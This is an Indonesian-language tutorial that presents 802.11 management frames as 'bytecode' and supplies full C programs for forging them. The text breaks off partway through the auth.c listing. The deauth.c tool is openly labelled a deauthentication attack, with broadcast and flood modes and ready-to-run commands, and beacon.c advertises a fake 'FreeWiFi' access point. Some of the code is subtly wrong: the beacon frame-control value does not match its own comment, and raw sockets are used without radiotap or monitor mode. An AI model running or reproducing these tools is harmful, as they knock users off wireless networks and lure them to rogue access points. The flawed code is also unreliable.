## 📡 Instruction Set & Bytecode 802.11

**802.11 bukanlah prosesor dengan instruction set**, melainkan **protokol komunikasi**. Namun, frame-frame 802.11 bisa dianggap sebagai "instruksi" yang dikirimkan melalui udara. Saya akan jelaskan **bytecode (frame format)** dan **implementasi lengkap** untuk berbagai fungsi.

---

## 📋 Daftar Isi

1. [Frame 802.11 sebagai "Bytecode"](#1-frame-80211-sebagai-bytecode)
2. [Format Frame Lengkap](#2-format-frame-lengkap)
3. [Management Frame Opcodes](#3-management-frame-opcodes)
4. [Implementasi Lengkap: deauth.c](#4-implementasi-lengkap-deauthc)
5. [Implementasi Lengkap: beacon.c](#5-implementasi-lengkap-beaconc)
6. [Implementasi Lengkap: probe.c](#6-implementasi-lengkap-probec)
7. [Implementasi Lengkap: auth.c](#7-implementasi-lengkap-authc)
8. [Implementasi Lengkap: assoc.c](#8-implementasi-lengkap-assocc)
9. [Frame Parser Lengkap](#9-frame-parser-lengkap)
10. [Contoh Program Full](#10-contoh-program-full)

---

## 1. Frame 802.11 sebagai "Bytecode"

### Analogi:

```
┌─────────────────────────────────────────────────────────────┐
│                    802.11 = "Bahasa"                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Setiap frame = "Kata"                                     │
│  Setiap field = "Huruf"                                    │
│  Setiap byte = "Bit"                                       │
│                                                             │
│  Beacon     = "Saya AP, nama saya FreeWiFi"                │
│  Probe Req  = "Ada AP bernama FreeWiFi?"                   │
│  Probe Resp = "Saya FreeWiFi!"                             │
│  Auth       = "Boleh connect?" / "Boleh!"                  │
│  Assoc      = "Saya mau join" / "Silahkan"                 │
│  Deauth     = "Keluar!"                                    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Sebagai "Bytecode" (Hex):

```
Beacon     = 80 00 00 00 FF FF FF FF FF FF ...
Probe Req  = 40 00 00 00 FF FF FF FF FF FF ...
Probe Resp = 50 00 00 00 00 11 22 33 44 55 ...
Auth       = B0 00 00 00 00 11 22 33 44 55 ...
Assoc      = 00 00 00 00 00 11 22 33 44 55 ...
Deauth     = C0 00 00 00 00 11 22 33 44 55 ...
```

---

## 2. Format Frame Lengkap

### Header 802.11 (24 bytes):

```
┌─────────────────────────────────────────────────────────────┐
│                   802.11 MAC HEADER                         │
├───────┬───────┬───────┬───────┬───────┬───────┬───────────┤
│ 2     │ 2     │ 6     │ 6     │ 6     │ 2     │ 4         │
├───────┼───────┼───────┼───────┼───────┼───────┼───────────┤
│Frame  │ Dur.  │ Addr1 │ Addr2 │ Addr3 │ Seq   │ Payload   │
│Ctrl   │       │(Dest) │(Src)  │(BSSID)│ Ctrl  │(variable) │
├───────┴───────┴───────┴───────┴───────┴───────┴───────────┤
│                                                             │
│  FCS (4 bytes) - CRC32 checksum                            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Frame Control Field (2 bytes):

```
┌─────┬─────┬─────┬─────┬─────┬─────┬─────┬─────┬─────┬─────┬─────┬─────┬─────┬─────┬─────┬─────┐
│ 15  │ 14  │ 13  │ 12  │ 11  │ 10  │ 9   │ 8   │ 7   │ 6   │ 5   │ 4   │ 3   │ 2   │ 1   │ 0   │
├─────┼─────┼─────┼─────┼─────┼─────┼─────┼─────┼─────┼─────┼─────┼─────┼─────┼─────┼─────┼─────┤
│     Protocol      │ Type  │          Subtype               │
│     Version       │       │                               │
│     (00)          │       │                               │
└───────────────────┴───────┴────────────────────────────────┘
```

**Type (bit 2-3):**
- `00` = Management
- `01` = Control
- `10` = Data

**Subtype (bit 4-7):**
- Management: `0000`=Assoc Req, `0001`=Assoc Resp, `0100`=Probe Req, `0101`=Probe Resp, `1000`=Beacon, `1011`=Auth, `1100`=Deauth

---

## 3. Management Frame Opcodes

### Daftar Opcode (Hex):

| Frame | Opcode (hex) | Binary |
|-------|--------------|--------|
| **Association Request** | `0x00` | `0000 0000` |
| **Association Response** | `0x10` | `0001 0000` |
| **Reassociation Request** | `0x20` | `0010 0000` |
| **Reassociation Response** | `0x30` | `0011 0000` |
| **Probe Request** | `0x40` | `0100 0000` |
| **Probe Response** | `0x50` | `0101 0000` |
| **Beacon** | `0x80` | `1000 0000` |
| **ATIM** | `0x90` | `1001 0000` |
| **Disassociation** | `0xA0` | `1010 0000` |
| **Authentication** | `0xB0` | `1011 0000` |
| **Deauthentication** | `0xC0` | `1100 0000` |
| **Action** | `0xD0` | `1101 0000` |

### Dengan Flag ToDS/FromDS (bit 6-7):

| Frame | Hex | Keterangan |
|-------|-----|------------|
| **Beacon** | `0x80` | ToDS=0, FromDS=0 |
| **Probe Req** | `0x40` | ToDS=0, FromDS=0 |
| **Probe Resp** | `0x50` | ToDS=0, FromDS=0 |
| **Auth** | `0xB0` | ToDS=0, FromDS=0 |
| **Assoc Req** | `0x00` | ToDS=0, FromDS=0 |
| **Assoc Resp** | `0x10` | ToDS=0, FromDS=0 |
| **Deauth** | `0xC0` | ToDS=0, FromDS=0 |

### Lengkap dengan Byte Order:

```c
// Frame Control = (Type << 2) | (Subtype << 4)
// Management = 0 << 2 = 0
// Beacon = 8 << 4 = 0x80
// Probe Request = 4 << 4 = 0x40
// Probe Response = 5 << 4 = 0x50
// Authentication = 11 << 4 = 0xB0
// Association Request = 0 << 4 = 0x00
// Association Response = 1 << 4 = 0x10
// Deauthentication = 12 << 4 = 0xC0
```

---

## 4. Implementasi Lengkap: `deauth.c`

```c
// deauth.c - Kirim Deauthentication Frame (Bytecode: 0xC0)
// Compile: gcc -o deauth deauth.c
// Jalankan: sudo ./deauth wlan0

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>
#include <time.h>

// ===== STRUKTUR HEADER 802.11 =====
typedef struct {
    uint16_t frame_control;    // 0xC000 = Deauth
    uint16_t duration;         // 0 = no NAV
    uint8_t addr1[6];          // Destination MAC (client)
    uint8_t addr2[6];          // Source MAC (AP)
    uint8_t addr3[6];          // BSSID (AP)
    uint16_t seq_ctrl;         // Sequence number
    uint8_t payload[];
} __attribute__((packed)) wifi_header_t;

// ===== REASON CODE (deauth reason) =====
typedef enum {
    REASON_UNSPECIFIED = 1,
    REASON_PREV_AUTH_INVALID = 2,
    REASON_DEAUTH_LEAVING = 3,
    REASON_DISASSOC_INACTIVE = 4,
    REASON_DISASSOC_AP_BUSY = 5,
    REASON_CLASS2_FRAME = 6,
    REASON_CLASS3_FRAME = 7,
    REASON_DISASSOC_STA_LEAVING = 8,
    REASON_STA_NOT_AUTH = 9,
    REASON_DISASSOC_POOR_SIGNAL = 10,
    REASON_INVALID_IE = 13,
    REASON_MIC_FAILURE = 14,
    REASON_4WAY_HANDSHAKE_TIMEOUT = 15,
    REASON_GROUP_KEY_UPDATE_TIMEOUT = 16,
    REASON_IE_IN_4WAY_DIFFERS = 17,
    REASON_INVALID_GROUP_CIPHER = 18,
    REASON_INVALID_PAIRWISE_CIPHER = 19,
    REASON_INVALID_AKMP = 20,
    REASON_UNSUPPORTED_RSNE_VERSION = 21,
    REASON_INVALID_RSNE_CAPABILITIES = 22,
    REASON_8021X_AUTH_FAILED = 23,
    REASON_CIPHER_OUT_OF_POLICY = 24,
} deauth_reason_t;

// ===== UTILITY FUNCTIONS =====

// MAC to string
void mac_to_string(const uint8_t *mac, char *str) {
    sprintf(str, "%02x:%02x:%02x:%02x:%02x:%02x",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// String to MAC
int string_to_mac(const char *str, uint8_t *mac) {
    if (strlen(str) != 17) return -1;
    for (int i = 0; i < 6; i++) {
        mac[i] = (uint8_t)strtol(str + (i * 3), NULL, 16);
    }
    return 0;
}

// ===== SOCKET FUNCTIONS =====

// Create raw socket
int create_raw_socket(const char *iface) {
    int sock;
    struct ifreq ifr;
    
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("socket");
        return -1;
    }
    
    strcpy(ifr.ifr_name, iface);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        return -1;
    }
    
    return sock;
}

// Send frame via raw socket
int send_frame(int sock, const uint8_t *buf, int len, const char *iface) {
    struct sockaddr_ll addr;
    struct ifreq ifr;
    
    strcpy(ifr.ifr_name, iface);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        return -1;
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ALL);
    addr.sll_ifindex = ifr.ifr_ifindex;
    addr.sll_halen = 6;
    
    int ret = sendto(sock, buf, len, 0, (struct sockaddr*)&addr, sizeof(addr));
    if (ret < 0) perror("sendto");
    return ret;
}

// ===== DEAUTH FUNCTIONS =====

// Build Deauth Frame
int build_deauth(uint8_t *buf, uint8_t *client_mac, uint8_t *ap_mac, 
                 uint16_t reason, uint16_t seq) {
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint8_t *pos = hdr->payload;
    
    // Frame Control: Deauthentication (0xC000)
    // Type=00 (Management), Subtype=1100 (Deauth)
    hdr->frame_control = htons(0xC000);
    hdr->duration = 0;
    
    // Address 1: Destination = Client MAC
    memcpy(hdr->addr1, client_mac, 6);
    
    // Address 2: Source = AP MAC
    memcpy(hdr->addr2, ap_mac, 6);
    
    // Address 3: BSSID = AP MAC
    memcpy(hdr->addr3, ap_mac, 6);
    
    // Sequence Control
    hdr->seq_ctrl = htons(seq << 4);
    
    // Reason Code (2 bytes)
    *pos++ = reason & 0xFF;        // Low byte
    *pos++ = (reason >> 8) & 0xFF; // High byte
    
    int len = sizeof(wifi_header_t) + 2;
    return len;
}

// Send Deauth to single client
int send_deauth_client(const char *iface, uint8_t *client_mac, 
                       uint8_t *ap_mac, uint16_t reason) {
    int sock;
    uint8_t buf[256];
    int len;
    static uint16_t seq = 0;
    
    sock = create_raw_socket(iface);
    if (sock < 0) return -1;
    
    len = build_deauth(buf, client_mac, ap_mac, reason, seq++);
    int ret = send_frame(sock, buf, len, iface);
    
    close(sock);
    
    char mac_str[18];
    mac_to_string(client_mac, mac_str);
    printf("[Deauth] Sent deauth to %s (reason: %d)\n", mac_str, reason);
    
    return ret;
}

// Send Deauth to all clients (broadcast)
int send_deauth_broadcast(const char *iface, uint8_t *ap_mac, uint16_t reason) {
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    return send_deauth_client(iface, broadcast, ap_mac, reason);
}

// Send Deauth with flooding (multiple times)
int send_deauth_flood(const char *iface, uint8_t *client_mac, 
                      uint8_t *ap_mac, uint16_t reason, int count) {
    int ret = 0;
    for (int i = 0; i < count; i++) {
        ret = send_deauth_client(iface, client_mac, ap_mac, reason);
        usleep(1000); // 1ms delay
    }
    return ret;
}

// ===== ARGUMENT PARSING =====

void print_usage(const char *prog) {
    printf("Usage: %s [OPTIONS]\n", prog);
    printf("\nOPTIONS:\n");
    printf("  -i <iface>     Interface (default: wlan0)\n");
    printf("  -c <mac>       Client MAC address (required)\n");
    printf("  -a <mac>       AP MAC address (BSSID)\n");
    printf("  -r <reason>    Reason code (1-24, default: 7)\n");
    printf("  -f <count>     Flood count (default: 1)\n");
    printf("  -b             Broadcast to all clients\n");
    printf("  -h             Show this help\n");
    printf("\nREASON CODES:\n");
    printf("  1  = Unspecified\n");
    printf("  3  = Leaving network\n");
    printf("  4  = Inactivity\n");
    printf("  7  = Class 3 frame from nonassociated STA (default)\n");
    printf("  14 = MIC failure\n");
    printf("  15 = 4-way handshake timeout\n");
}

// ===== MAIN =====

int main(int argc, char *argv[]) {
    const char *iface = "wlan0";
    uint8_t client_mac[6] = {0};
    uint8_t ap_mac[6] = {0};
    uint16_t reason = 7;
    int flood_count = 1;
    int broadcast = 0;
    int client_set = 0;
    int ap_set = 0;
    
    // Parse arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-i") == 0 && i+1 < argc) {
            iface = argv[++i];
        } else if (strcmp(argv[i], "-c") == 0 && i+1 < argc) {
            if (string_to_mac(argv[++i], client_mac) == 0) client_set = 1;
        } else if (strcmp(argv[i], "-a") == 0 && i+1 < argc) {
            if (string_to_mac(argv[++i], ap_mac) == 0) ap_set = 1;
        } else if (strcmp(argv[i], "-r") == 0 && i+1 < argc) {
            reason = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-f") == 0 && i+1 < argc) {
            flood_count = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-b") == 0) {
            broadcast = 1;
        } else if (strcmp(argv[i], "-h") == 0) {
            print_usage(argv[0]);
            return 0;
        }
    }
    
    // Check arguments
    if (!client_set && !broadcast) {
        fprintf(stderr, "Error: Client MAC required (use -c or -b)\n");
        print_usage(argv[0]);
        return 1;
    }
    
    if (!ap_set) {
        // Generate random AP MAC if not specified
        ap_mac[0] = 0x02;
        for (int i = 1; i < 6; i++) {
            ap_mac[i] = rand() & 0xFF;
        }
        char mac_str[18];
        mac_to_string(ap_mac, mac_str);
        printf("[Deauth] Using random BSSID: %s\n", mac_str);
    }
    
    // Validate reason
    if (reason < 1 || reason > 24) {
        fprintf(stderr, "Error: Invalid reason code (1-24)\n");
        return 1;
    }
    
    // Print configuration
    char client_str[18], ap_str[18];
    mac_to_string(client_mac, client_str);
    mac_to_string(ap_mac, ap_str);
    
    printf("========================================\n");
    printf("  DEAUTH ATTACK\n");
    printf("========================================\n");
    printf("Interface:   %s\n", iface);
    printf("Client MAC:  %s\n", broadcast ? "BROADCAST" : client_str);
    printf("AP MAC:      %s\n", ap_str);
    printf("Reason:      %d\n", reason);
    printf("Flood count: %d\n", flood_count);
    printf("========================================\n\n");
    
    // Send deauth
    int ret;
    if (broadcast) {
        ret = send_deauth_broadcast(iface, ap_mac, reason);
    } else {
        ret = send_deauth_flood(iface, client_mac, ap_mac, reason, flood_count);
    }
    
    printf("\n[Deauth] Done! (ret=%d)\n", ret);
    return 0;
}
```

### Compile & Test:

```bash
# Compile
gcc -o deauth deauth.c

# Deauth single client
sudo ./deauth -c 00:11:22:33:44:55 -a 02:11:22:33:44:55

# Deauth broadcast (semua client)
sudo ./deauth -b -a 02:11:22:33:44:55

# Flood deauth (100x)
sudo ./deauth -c 00:11:22:33:44:55 -a 02:11:22:33:44:55 -f 100

# With custom reason
sudo ./deauth -c 00:11:22:33:44:55 -a 02:11:22:33:44:55 -r 3
```

---

## 5. Implementasi Lengkap: `beacon.c`

```c
// beacon.c - Kirim Beacon Frame (Bytecode: 0x80)
// Compile: gcc -o beacon beacon.c
// Jalankan: sudo ./beacon wlan0 FreeWiFi 6

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>

// ===== STRUKTUR HEADER 802.11 =====
typedef struct {
    uint16_t frame_control;    // 0x80 = Beacon
    uint16_t duration;
    uint8_t addr1[6];          // Broadcast (FF:FF:FF:FF:FF:FF)
    uint8_t addr2[6];          // BSSID
    uint8_t addr3[6];          // BSSID
    uint16_t seq_ctrl;
    uint8_t payload[];
} __attribute__((packed)) wifi_header_t;

// ===== UTILITY FUNCTIONS =====

void mac_to_string(const uint8_t *mac, char *str) {
    sprintf(str, "%02x:%02x:%02x:%02x:%02x:%02x",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

int create_raw_socket(const char *iface) {
    int sock;
    struct ifreq ifr;
    
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("socket");
        return -1;
    }
    
    strcpy(ifr.ifr_name, iface);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        return -1;
    }
    
    return sock;
}

int send_frame(int sock, const uint8_t *buf, int len, const char *iface) {
    struct sockaddr_ll addr;
    struct ifreq ifr;
    
    strcpy(ifr.ifr_name, iface);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        return -1;
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ALL);
    addr.sll_ifindex = ifr.ifr_ifindex;
    addr.sll_halen = 6;
    memset(addr.sll_addr, 0xFF, 6); // Broadcast
    
    return sendto(sock, buf, len, 0, (struct sockaddr*)&addr, sizeof(addr));
}

// ===== BUILD BEACON =====

int build_beacon(uint8_t *buf, uint8_t *bssid, const char *ssid, 
                 int channel, uint16_t seq) {
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint8_t *pos = hdr->payload;
    int ssid_len = strlen(ssid);
    
    if (ssid_len > 32) ssid_len = 32;
    
    // Frame Control: Beacon (0x80)
    hdr->frame_control = htons(0x80 << 4); // 0x8000
    hdr->duration = 0;
    
    // Address 1: Broadcast
    memset(hdr->addr1, 0xFF, 6);
    
    // Address 2: BSSID (Source)
    memcpy(hdr->addr2, bssid, 6);
    
    // Address 3: BSSID
    memcpy(hdr->addr3, bssid, 6);
    
    // Sequence Control
    hdr->seq_ctrl = htons(seq << 4);
    
    // === BEACON BODY ===
    
    // Timestamp (8 bytes) - 0 = not synchronized
    memset(pos, 0, 8);
    pos += 8;
    
    // Beacon Interval: 100 TU (102.4 ms)
    *pos++ = 0x64;  // 100
    *pos++ = 0x00;
    
    // Capability: ESS (0x0001)
    *pos++ = 0x01;  // ESS=1
    *pos++ = 0x00;
    
    // === IE: SSID (0) ===
    *pos++ = 0;              // Tag ID: SSID
    *pos++ = ssid_len;       // Length
    memcpy(pos, ssid, ssid_len);
    pos += ssid_len;
    
    // === IE: Supported Rates (1) ===
    *pos++ = 1;              // Tag ID: Supported Rates
    *pos++ = 4;              // Length: 4
    *pos++ = 0x82;           // 1 Mbps (B)
    *pos++ = 0x84;           // 2 Mbps (B)
    *pos++ = 0x8B;           // 5.5 Mbps (B)
    *pos++ = 0x96;           // 11 Mbps (B)
    
    // === IE: DS Parameter Set (3) ===
    *pos++ = 3;              // Tag ID: DS Parameter Set
    *pos++ = 1;              // Length: 1
    *pos++ = channel;        // Channel number
    
    // === IE: Extended Supported Rates (50) ===
    *pos++ = 50;             // Tag ID: Extended Supported Rates
    *pos++ = 4;              // Length: 4
    *pos++ = 0x0C;           // 6 Mbps
    *pos++ = 0x12;           // 9 Mbps
    *pos++ = 0x24;           // 18 Mbps
    *pos++ = 0x48;           // 36 Mbps
    
    // === IE: RSN (48) - WPA2 ===
    // Optional, uncomment for WPA2
    /*
    *pos++ = 48;             // Tag ID: RSN
    *pos++ = 20;             // Length: 20
    *pos++ = 0x01; *pos++ = 0x00; // Version: 1
    *pos++ = 0x00; *pos++ = 0x0F; // Group cipher
    *pos++ = 0xAC; *pos++ = 0x04; // CCMP
    // ... more RSN IE
    */
    
    int len = pos - buf;
    return len;
}

// ===== SEND BEACON =====

int send_beacon(const char *iface, uint8_t *bssid, const char *ssid, 
                int channel) {
    int sock;
    uint8_t buf[512];
    int len;
    static uint16_t seq = 0;
    
    sock = create_raw_socket(iface);
    if (sock < 0) return -1;
    
    len = build_beacon(buf, bssid, ssid, channel, seq++);
    int ret = send_frame(sock, buf, len, iface);
    
    close(sock);
    return ret;
}

// ===== MAIN =====

int main(int argc, char *argv[]) {
    const char *iface = "wlan0";
    const char *ssid = "FreeWiFi";
    int channel = 6;
    uint8_t bssid[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    int interval = 100; // ms
    
    // Parse arguments
    if (argc > 1) iface = argv[1];
    if (argc > 2) ssid = argv[2];
    if (argc > 3) channel = atoi(argv[3]);
    if (argc > 4) interval = atoi(argv[4]);
    
    char bssid_str[18];
    mac_to_string(bssid, bssid_str);
    
    printf("========================================\n");
    printf("  BEACON BROADCASTER\n");
    printf("========================================\n");
    printf("Interface: %s\n", iface);
    printf("SSID:      %s\n", ssid);
    printf("BSSID:     %s\n", bssid_str);
    printf("Channel:   %d\n", channel);
    printf("Interval:  %d ms\n", interval);
    printf("========================================\n\n");
    
    printf("[Beacon] Broadcasting...\n");
    printf("[Beacon] Press Ctrl+C to stop\n");
    
    while (1) {
        int ret = send_beacon(iface, bssid, ssid, channel);
        if (ret < 0) {
            printf("[Beacon] Error sending beacon\n");
        }
        usleep(interval * 1000);
    }
    
    return 0;
}
```

### Compile & Test:

```bash
gcc -o beacon beacon.c
sudo ./beacon wlan0 FreeWiFi 6
# SSID "FreeWiFi" muncul di HP
```

---

## 6. Implementasi Lengkap: `probe.c`

```c
// probe.c - Kirim Probe Request/Response (Bytecode: 0x40 / 0x50)
// Compile: gcc -o probe probe.c
// Jalankan: sudo ./probe -r -c 00:11:22:33:44:55

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>

typedef struct {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t seq_ctrl;
    uint8_t payload[];
} __attribute__((packed)) wifi_header_t;

void mac_to_string(const uint8_t *mac, char *str) {
    sprintf(str, "%02x:%02x:%02x:%02x:%02x:%02x",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

int create_raw_socket(const char *iface) {
    int sock;
    struct ifreq ifr;
    
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("socket");
        return -1;
    }
    
    strcpy(ifr.ifr_name, iface);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        return -1;
    }
    
    return sock;
}

int send_frame(int sock, const uint8_t *buf, int len, const char *iface) {
    struct sockaddr_ll addr;
    struct ifreq ifr;
    
    strcpy(ifr.ifr_name, iface);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        return -1;
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ALL);
    addr.sll_ifindex = ifr.ifr_ifindex;
    addr.sll_halen = 6;
    
    return sendto(sock, buf, len, 0, (struct sockaddr*)&addr, sizeof(addr));
}

// ===== BUILD PROBE REQUEST =====

int build_probe_request(uint8_t *buf, uint8_t *src_mac, uint8_t *dst_mac,
                        const char *ssid, uint16_t seq) {
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint8_t *pos = hdr->payload;
    int ssid_len = strlen(ssid);
    
    if (ssid_len > 32) ssid_len = 32;
    
    // Frame Control: Probe Request (0x40)
    hdr->frame_control = htons(0x40 << 4); // 0x4000
    hdr->duration = 0;
    
    // Address 1: Destination (broadcast or specific)
    if (dst_mac) {
        memcpy(hdr->addr1, dst_mac, 6);
    } else {
        memset(hdr->addr1, 0xFF, 6);
    }
    
    // Address 2: Source (client)
    memcpy(hdr->addr2, src_mac, 6);
    
    // Address 3: BSSID (broadcast)
    memset(hdr->addr3, 0xFF, 6);
    
    hdr->seq_ctrl = htons(seq << 4);
    
    // SSID IE
    *pos++ = 0;              // Tag: SSID
    *pos++ = ssid_len;
    memcpy(pos, ssid, ssid_len);
    pos += ssid_len;
    
    // Supported Rates
    *pos++ = 1; *pos++ = 4;
    *pos++ = 0x82; *pos++ = 0x84;
    *pos++ = 0x8B; *pos++ = 0x96;
    
    return pos - buf;
}

// ===== BUILD PROBE RESPONSE =====

int build_probe_response(uint8_t *buf, uint8_t *client_mac, uint8_t *bssid,
                         const char *ssid, int channel, uint16_t seq) {
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint8_t *pos = hdr->payload;
    int ssid_len = strlen(ssid);
    
    if (ssid_len > 32) ssid_len = 32;
    
    // Frame Control: Probe Response (0x50)
    hdr->frame_control = htons(0x50 << 4); // 0x5000
    hdr->duration = 0;
    
    // Address 1: Client MAC
    memcpy(hdr->addr1, client_mac, 6);
    
    // Address 2: BSSID (AP)
    memcpy(hdr->addr2, bssid, 6);
    
    // Address 3: BSSID
    memcpy(hdr->addr3, bssid, 6);
    
    hdr->seq_ctrl = htons(seq << 4);
    
    // Timestamp
    memset(pos, 0, 8); pos += 8;
    
    // Beacon Interval
    *pos++ = 0x64; *pos++ = 0x00;
    
    // Capability
    *pos++ = 0x01; *pos++ = 0x00;
    
    // SSID
    *pos++ = 0; *pos++ = ssid_len;
    memcpy(pos, ssid, ssid_len);
    pos += ssid_len;
    
    // Rates
    *pos++ = 1; *pos++ = 4;
    *pos++ = 0x82; *pos++ = 0x84;
    *pos++ = 0x8B; *pos++ = 0x96;
    
    // Channel
    *pos++ = 3; *pos++ = 1; *pos++ = channel;
    
    return pos - buf;
}

// ===== SEND PROBE REQUEST =====

int send_probe_request(const char *iface, uint8_t *src_mac, 
                       const char *ssid) {
    int sock;
    uint8_t buf[256];
    int len;
    static uint16_t seq = 0;
    
    sock = create_raw_socket(iface);
    if (sock < 0) return -1;
    
    len = build_probe_request(buf, src_mac, NULL, ssid, seq++);
    int ret = send_frame(sock, buf, len, iface);
    
    close(sock);
    return ret;
}

// ===== SEND PROBE RESPONSE =====

int send_probe_response(const char *iface, uint8_t *client_mac, 
                        uint8_t *bssid, const char *ssid, int channel) {
    int sock;
    uint8_t buf[256];
    int len;
    static uint16_t seq = 0;
    
    sock = create_raw_socket(iface);
    if (sock < 0) return -1;
    
    len = build_probe_response(buf, client_mac, bssid, ssid, channel, seq++);
    int ret = send_frame(sock, buf, len, iface);
    
    close(sock);
    return ret;
}

// ===== MAIN =====

int main(int argc, char *argv[]) {
    const char *iface = "wlan0";
    uint8_t mac[6] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};
    uint8_t bssid[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    const char *ssid = "FreeWiFi";
    int response = 0;
    int channel = 6;
    
    // Parse arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-r") == 0) {
            response = 1;
        } else if (strcmp(argv[i], "-c") == 0 && i+1 < argc) {
            sscanf(argv[++i], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
        } else if (strcmp(argv[i], "-s") == 0 && i+1 < argc) {
            ssid = argv[++i];
        } else if (strcmp(argv[i], "-i") == 0 && i+1 < argc) {
            iface = argv[++i];
        }
    }
    
    char mac_str[18];
    mac_to_string(mac, mac_str);
    
    printf("========================================\n");
    printf("  PROBE TOOL\n");
    printf("========================================\n");
    printf("Interface: %s\n", iface);
    printf("MAC:       %s\n", mac_str);
    printf("SSID:      %s\n", ssid);
    printf("Mode:      %s\n", response ? "Response" : "Request");
    printf("========================================\n\n");
    
    if (response) {
        send_probe_response(iface, mac, bssid, ssid, channel);
        printf("[Probe] Response sent to %s\n", mac_str);
    } else {
        send_probe_request(iface, mac, ssid);
        printf("[Probe] Request sent for SSID: %s\n", ssid);
    }
    
    return 0;
}
```

---

## 7. Implementasi Lengkap: `auth.c`

```c
// auth.c - Kirim Authentication Frame (Bytecode: 0xB0)
// Compile: gcc -o auth auth.c
// Jalankan: sudo ./auth -c 00:11:22:33:44:55 -a 02:11:22:33:44:55

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>

typedef struct {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t seq_ctrl;
    uint8_t payload[];
} __attribute__((packed)) wifi_header_t;

// ===== AUTHENTICATION ALGORITHMS =====
typedef enum {
    AUTH_OPEN = 0,
    AUTH_SHARED_KEY = 1,
    AUTH_FAST_BSS = 2,
    AUTH_SAE = 3,
} auth_algorithm_t;

// ===== STATUS CODES =====
typedef enum {
    STATUS_SUCCESS = 0,
    STATUS_UNSPECIFIED = 1,
    STATUS_CAPABILITY = 17,
    STATUS_REASSOC = 18,
    STATUS_ASSOC_DENIED = 19,
    STATUS_AUTH_ALGO = 20,
    STATUS_AUTH_SEQ = 21,
    STATUS_CHALLENGE_FAIL = 22,
    STATUS_TIMEOUT = 23,
    STATUS_AP_BUSY = 24,
    STATUS_BAD_RSNE = 25,
    STATUS_PMKID_FAIL = 26,
} auth_status_t;

void mac_to_string(const uint8_t *mac, char *str) {
    sprintf(str, "%02x:%02x:%02x:%02x:%02x:%02x",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

int string_to_mac(const char *str, uint8_t *mac) {
    return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6;
}

int create_raw_socket(const char *iface) {
    int sock;
    struct ifreq ifr;
    
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("socket");
        return -1;
    }
    
    strcpy(ifr.ifr_name, iface);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        return -1;
    }
    
    return sock;
}

int send_frame(int sock, const uint8_t *buf, int len, const char *iface) {
    struct sockaddr_ll addr;
    struct ifreq ifr;
    
    strcpy(ifr.ifr_name, iface);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        return -1;
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
